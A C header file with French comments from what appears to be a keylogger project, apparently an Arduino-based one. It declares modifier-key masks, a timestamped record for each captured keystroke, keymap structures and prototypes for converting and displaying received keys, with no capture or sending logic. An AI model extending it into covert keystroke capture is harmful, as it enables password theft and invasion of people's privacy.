/***********************************************************************
* FILENAME :  key_tranform.h
*
* DESCRIPTION :
*       Fichier qui declare les structures et les fonctions pour traduire
*       une touche recu par le keylogger en structure pour les fichiers
*       et inversement
*
* AUTHOR :    Yanis GENY          START DATE :    26 Jan 2024
************************************************************************/

#ifndef __KEY_TRANSFORM_H_
#define __KEY_TRANSFORM_H_

#include <time.h>
#include <sys/time.h>

#include "server_interact.h"

// definition des mask des mod possible du clavier
// definie selon le code source de KeyboardController sur arduino
#define LEFT_CTRL   0x01
#define LEFT_SHIFT  0x02
#define ALT         0x04
#define LEFT_CMD    0x08
#define RIGHT_CTRL  0x10
#define RIGHT_SHIFT 0x20
#define ALT_GR      0x40
#define RIGHT_CMD   0x80

// structure qui correpond a ce qui sera sauvegarde dans le fichier out
struct save_char_t {
	struct timeval timestamp; // date de la reception de la touche
	int            mod;       // mod utilise sur le clavier
	char           ch;        // valeur de la touche presse
};

/* Structure pour les keymaps */
struct transform_key_t {
	int  key_value;
	char char_convert[20];
};

struct keymaps_t {
	char                   name[50];
	struct transform_key_t keymap[100];
};

void tranforme_received_key(struct receive_key key, struct save_char_t *key_save);
void tranforme_received_key_to_key(struct receive_key *key, struct save_char_t key_save);
void show_key_on_terminal(struct receive_key key, int fd);
void list_mod_key_terminal(int mod, int fd);
int  found_key_on_keymaps(int key_value, struct keymaps_t *keymap, char *key);
int  found_value_from_key_speudokeylog(char *key, int *keyvalue);

#endif